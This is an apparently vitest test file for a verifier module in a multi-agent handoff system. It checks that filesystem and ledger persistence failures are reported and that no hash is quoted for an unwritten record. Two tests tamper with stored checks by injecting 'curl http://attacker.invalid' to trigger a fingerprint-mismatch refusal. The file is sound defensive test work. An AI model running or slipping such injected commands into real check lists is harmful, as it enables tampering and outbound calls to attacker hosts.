/**
 * What Echo is told when the evidence could not be persisted.
 *
 * The failure modes are real, not mocked away: the evidence root is made
 * unwritable on a temporary filesystem, and the `handoff_events` table is
 * dropped from the temporary database. Both halves are independent, so all four
 * combinations are reachable — and a reviewing agent must never be handed a
 * `record_sha256` for a record that is not on disk.
 */
import { execFileSync } from 'child_process';
import fs from 'fs';
import os from 'os';
import path from 'path';

import { afterEach, beforeEach, describe, expect, it, vi } from 'vitest';

const mockState = vi.hoisted(() => ({ allowlistPath: '' }));
const notifications = vi.hoisted(() => ({ messages: [] as string[] }));

vi.mock('../../config.js', async () => {
  const actual = await vi.importActual<Record<string, unknown>>('../../config.js');
  return {
    ...actual,
    get MOUNT_ALLOWLIST_PATH() {
      return mockState.allowlistPath;
    },
  };
});

vi.mock('../approvals/primitive.js', () => ({
  notifyAgent: async (_session: unknown, text: string) => {
    notifications.messages.push(text);
  },
}));

import { createAgentGroup } from '../../db/agent-groups.js';
import { closeDb, getDb, initTestDb } from '../../db/connection.js';
import { runMigrations } from '../../db/migrations/index.js';
import type { Session } from '../../types.js';
import { createHandoff, deliverHandoffWithInputs, type HandoffRow } from '../handoff-ledger/ledger.js';
import '../handoff-ledger/migration.js';
import './migration.js';
import { execNoShell, HANDSHAKE_PREFIX, type DockerRunResult, type ExecResult } from './docker.js';
import { runChecksAction, type VerifierDeps } from './index.js';
import { sha256Hex } from './record.js';

const ECHO = 'ag-echo';
const ATLAS = 'ag-atlas';

let tmpDir: string;
let repoDir: string;
let dataDir: string;
let gateDir: string;
let configPath: string;
let checkpoint: string;
let counter: number;

function result(nonce: string, over: Partial<DockerRunResult> = {}): DockerRunResult {
  const startedAt = new Date().toISOString();
  return {
    exitCode: 1,
    timedOut: false,
    spawnFailed: false,
    // A well-behaved container: the host's own nonce comes back as the first
    // stdout line, so the exit code below is the CHECK's.
    handshakeLine: `${HANDSHAKE_PREFIX}${nonce}`,
    stdout: 'check output\n',
    stderr: '',
    stdoutBytes: 13,
    stderrBytes: 0,
    stdoutTruncated: false,
    stderrTruncated: false,
    startedAt,
    finishedAt: startedAt,
    wallSeconds: 0.5,
    ...over,
  };
}

function gone(name: string): ExecResult {
  return {
    code: 1,
    stdout: '',
    stderr: `Error response from daemon: No such container: ${name}\n`,
    ok: false,
    timedOut: false,
    error: 'Command failed',
  };
}

function deps(over: Partial<VerifierDeps> = {}): VerifierDeps {
  return {
    configPath,
    dataDir,
    gateDir,
    tmpRoot: tmpDir,
    runDocker: async (_file, _argv, options) => result(options.nonce),
    exec: async (file, argv, options) => {
      if (file === 'git') return execNoShell(file, argv, options);
      if (argv[0] === 'inspect' && argv[1] === '--type') return gone(argv[3]!);
      return { code: 0, stdout: 'sha256:deadbeef|\n', stderr: '', ok: true, timedOut: false };
    },
    resolveImageRef: async () => 'nanoclaw-agent:test',
    ...over,
  };
}

function session(): Session {
  return {
    id: 'sess-persist',
    agent_group_id: ECHO,
    messaging_group_id: null,
    thread_id: null,
    agent_provider: null,
    status: 'active',
    container_status: 'running',
    last_active: null,
    created_at: new Date().toISOString(),
  };
}

async function delivered(over: { project?: string } = {}): Promise<HandoffRow> {
  const row = await createHandoff({
    id: `H-PERSIST-${++counter}`,
    sourceAgentGroupId: ATLAS,
    reviewerAgentGroupId: ECHO,
    project: over.project ?? 'FIXTURE',
    goal: 'Surface a persistence failure instead of swallowing it',
    outcome: 'A host-attested evidence record',
    scope: 'verifier module only',
    authority: 'execute',
  });
  await deliverHandoffWithInputs({
    id: row.id,
    actor: ATLAS,
    fingerprint: row.fingerprint,
    inputs: { class: 'fix', checkpoint, checks: ['true'], reproduce: [] },
  });
  return row;
}

/**
 * Make the evidence root refuse new directories. 0500 denies write to the owner
 * too, which is what a full or read-only volume looks like from here.
 */
function sealEvidenceRoot(): string {
  const root = path.join(dataDir, 'evidence');
  fs.mkdirSync(root, { recursive: true, mode: 0o700 });
  fs.chmodSync(root, 0o500);
  return root;
}

async function breakLedgerEvents(): Promise<void> {
  await getDb().run('DROP TABLE handoff_events');
}

beforeEach(async () => {
  tmpDir = fs.realpathSync(fs.mkdtempSync(path.join(os.tmpdir(), 'ncl-verifier-persist-')));
  repoDir = path.join(tmpDir, 'allowed', 'fixture-repo');
  dataDir = path.join(tmpDir, 'data');
  gateDir = path.join(tmpDir, 'gate');
  fs.mkdirSync(repoDir, { recursive: true });
  fs.mkdirSync(dataDir, { recursive: true });
  fs.mkdirSync(gateDir, { recursive: true });
  fs.writeFileSync(path.join(gateDir, 'run-check.sh'), '#!/bin/bash\nset -u\ncmd=$(cat)\nexec bash -c "$cmd"\n', {
    mode: 0o755,
  });

  fs.writeFileSync(path.join(repoDir, 'package.json'), '{"name":"fixture"}\n');
  execFileSync('git', ['init', '-q'], { cwd: repoDir });
  execFileSync('git', ['add', '.'], { cwd: repoDir });
  execFileSync(
    'git',
    ['-c', 'user.name=fixture', '-c', 'user.email=fixture@example.invalid', 'commit', '-q', '-m', 'fixture'],
    { cwd: repoDir },
  );
  checkpoint = execFileSync('git', ['rev-parse', 'HEAD'], { cwd: repoDir, encoding: 'utf8' }).trim();

  mockState.allowlistPath = path.join(tmpDir, 'mount-allowlist.json');
  fs.writeFileSync(
    mockState.allowlistPath,
    JSON.stringify({
      allowedRoots: [{ path: path.join(tmpDir, 'allowed'), allowReadWrite: false }],
      blockedPatterns: [],
    }),
  );

  configPath = path.join(tmpDir, 'verifier.json');
  fs.writeFileSync(
    configPath,
    JSON.stringify({
      echoGroupId: ECHO,
      atlasGroupId: ATLAS,
      projects: { FIXTURE: { hostPath: repoDir, mount: 'fixture' } },
    }),
    { mode: 0o600 },
  );
  fs.chmodSync(configPath, 0o600);

  counter = 0;
  notifications.messages = [];

  const db = await initTestDb();
  await runMigrations(db);
  const created_at = new Date().toISOString();
  await createAgentGroup({ id: ECHO, name: 'Echo', folder: 'echo', agent_provider: null, created_at });
  await createAgentGroup({ id: ATLAS, name: 'Atlas', folder: 'atlas', agent_provider: null, created_at });
});

afterEach(async () => {
  await closeDb();
  const root = path.join(dataDir, 'evidence');
  if (fs.existsSync(root)) fs.chmodSync(root, 0o700);
  fs.rmSync(tmpDir, { recursive: true, force: true });
});

describe('a persistence failure is named, never swallowed', () => {
  it('B1: a disk that will not take the record says so, and quotes no hash', async () => {
    sealEvidenceRoot();
    const row = await delivered();

    const outcome = await runChecksAction({ handoff_id: row.id }, session(), deps());

    expect(outcome.refused).toBe(false);
    // The run itself happened and its verdict is real.
    expect(outcome.verdict).toBe('CHECK_FAILED');
    expect(outcome.persistence).toEqual({ filesystem: 'failed', ledger_event: 'ok' });
    expect(outcome.record_sha256).toBeNull();
    expect(outcome.run_dir).toBeNull();
    expect(outcome.errors.join('\n')).toMatch(/^filesystem: /m);

    const message = notifications.messages[0]!;
    expect(message).toContain('filesystem persistence FAILED');
    expect(message).not.toContain('ledger event persistence FAILED');
    expect(message).toContain('persistence: filesystem=failed ledger_event=ok');
    // No hash of a record that is not there.
    expect(message).toContain('record_sha256: NONE (the record was not written)');
    expect(message).not.toMatch(/record_sha256: [0-9a-f]{64}/);

    // The ledger event was still attempted, and it carries the same null.
    const event = await getDb().get<{ payload_json: string; event_type: string }>(
      'SELECT * FROM handoff_events WHERE handoff_id = ? ORDER BY sequence DESC LIMIT 1',
      row.id,
    );
    expect(event!.event_type).toBe('verification');
    expect(JSON.parse(event!.payload_json)).toMatchObject({
      record_sha256: null,
      run_dir: null,
      verdict: 'CHECK_FAILED',
      checks_ran: 1,
    });
  });

  it('B2: a ledger that will not take the event says so, and the record still hashes', async () => {
    // The handoff is created first: `createHandoff` writes its own events, and
    // the table has to survive long enough for the run to be legitimate.
    const row = await delivered();
    await breakLedgerEvents();

    const outcome = await runChecksAction({ handoff_id: row.id }, session(), deps());

    expect(outcome.persistence).toEqual({ filesystem: 'ok', ledger_event: 'failed' });
    expect(outcome.record_sha256).toMatch(/^[0-9a-f]{64}$/);
    expect(outcome.run_dir).toBeTruthy();
    expect(outcome.errors.join('\n')).toMatch(/^ledger_event: /m);

    // The record is on disk and its hash is the hash of those exact bytes.
    const bytes = fs.readFileSync(path.join(outcome.run_dir!, 'record.json'));
    expect(outcome.record_sha256).toBe(sha256Hex(bytes));
    expect(fs.readFileSync(path.join(outcome.run_dir!, 'record.sha256'), 'utf8').trim()).toBe(outcome.record_sha256);

    const message = notifications.messages[0]!;
    expect(message).toContain('ledger event persistence FAILED');
    expect(message).not.toContain('filesystem persistence FAILED');
    expect(message).toContain(`record_sha256: ${outcome.record_sha256}`);
    expect(message).toContain('persistence: filesystem=ok ledger_event=failed');
    // The record itself still says `pending`; the sibling carries the answer.
    expect(JSON.parse(fs.readFileSync(path.join(outcome.run_dir!, 'record.json'), 'utf8')).persistence).toEqual({
      filesystem: 'ok',
      ledger_event: 'pending',
    });
    const resolved = JSON.parse(fs.readFileSync(path.join(outcome.run_dir!, 'persistence.json'), 'utf8'));
    expect(resolved).toMatchObject({ filesystem: 'ok', ledger_event: 'failed' });
    expect(resolved.errors.join('\n')).toMatch(/^ledger_event: /m);
  });

  it('B3: when both fail, both are named', async () => {
    const row = await delivered();
    sealEvidenceRoot();
    await breakLedgerEvents();

    const outcome = await runChecksAction({ handoff_id: row.id }, session(), deps());

    expect(outcome.persistence).toEqual({ filesystem: 'failed', ledger_event: 'failed' });
    expect(outcome.record_sha256).toBeNull();
    expect(outcome.run_dir).toBeNull();
    expect(outcome.errors).toHaveLength(2);

    const message = notifications.messages[0]!;
    expect(message).toContain('filesystem persistence FAILED');
    expect(message).toContain('ledger event persistence FAILED');
    expect(message).toContain('Do not cite this run as recorded evidence.');
    expect(message).toContain('record_sha256: NONE');
    // The verdict itself is still reported: the run did happen.
    expect(message).toContain('verdict: CHECK_FAILED');
    expect(message).toContain('c1 ran exit=1');
  });

  it('B4: a refusal reports its own persistence, under its own event type', async () => {
    const row = await delivered();
    // A refusal that is reached AFTER the ledger row was read, so it appends an
    // event: the stored checks no longer match their fingerprint.
    await getDb().run(
      'UPDATE verification_inputs SET checks_json = ? WHERE handoff_id = ?',
      JSON.stringify(['curl http://attacker.invalid']),
      row.id,
    );

    const good = await runChecksAction({ handoff_id: row.id }, session(), deps());
    expect(good).toMatchObject({ refused: true, verdict: 'REFUSED', reason: 'inputs fingerprint mismatch' });
    expect(good.persistence).toEqual({ filesystem: 'ok', ledger_event: 'ok' });
    const refusalEvent = await getDb().get<{ event_type: string; payload_json: string; actor_agent_group_id: string }>(
      'SELECT * FROM handoff_events WHERE handoff_id = ? ORDER BY sequence DESC LIMIT 1',
      row.id,
    );
    expect(refusalEvent!.event_type).toBe('verification_refused');
    expect(refusalEvent!.actor_agent_group_id).toBe('host:verifier');
    expect(JSON.parse(refusalEvent!.payload_json)).toMatchObject({
      refusal_reason: 'inputs fingerprint mismatch',
      record_sha256: good.record_sha256,
      verdict: null,
      error_reason: null,
      checks_ran: 0,
    });

    // Now break the ledger and refuse again: the refusal must say so.
    await breakLedgerEvents();
    notifications.messages = [];
    const broken = await runChecksAction({ handoff_id: row.id }, session(), deps());

    expect(broken).toMatchObject({ refused: true, verdict: 'REFUSED' });
    expect(broken.persistence).toEqual({ filesystem: 'ok', ledger_event: 'failed' });
    expect(broken.record_sha256).toMatch(/^[0-9a-f]{64}$/);
    const message = notifications.messages[0]!;
    expect(message).toContain('run_checks refused: inputs fingerprint mismatch');
    expect(message).toContain('ledger event persistence FAILED');
    expect(JSON.parse(fs.readFileSync(path.join(broken.run_dir!, 'record.json'), 'utf8')).refusal_reason).toBe(
      'inputs fingerprint mismatch',
    );
  });

  it('B5: a refusal whose record cannot be written quotes no hash either', async () => {
    sealEvidenceRoot();
    const row = await delivered();
    await getDb().run(
      'UPDATE verification_inputs SET checks_json = ? WHERE handoff_id = ?',
      JSON.stringify(['curl http://attacker.invalid']),
      row.id,
    );

    const outcome = await runChecksAction({ handoff_id: row.id }, session(), deps());

    expect(outcome).toMatchObject({ refused: true, verdict: 'REFUSED' });
    expect(outcome.persistence).toEqual({ filesystem: 'failed', ledger_event: 'ok' });
    expect(outcome.record_sha256).toBeNull();
    expect(outcome.run_dir).toBeNull();
    expect(notifications.messages[0]!).toContain('filesystem persistence FAILED');
    expect(notifications.messages[0]!).not.toMatch(/[0-9a-f]{64}/);
  });

  it('B6: record.json is renamed into place, so a partial file is never left behind', async () => {
    const row = await delivered();
    const outcome = await runChecksAction({ handoff_id: row.id }, session(), deps());

    const entries = fs.readdirSync(outcome.run_dir!).sort();
    expect(entries).toEqual([
      'check-1.stderr.txt',
      'check-1.stdout.txt',
      'persistence.json',
      'record.json',
      'record.sha256',
    ]);
    expect(entries.some((name) => name.endsWith('.tmp'))).toBe(false);
    // The per-check output file holds what that container printed, verbatim.
    expect(fs.readFileSync(path.join(outcome.run_dir!, 'check-1.stdout.txt'), 'utf8')).toBe('check output\n');
  });
});
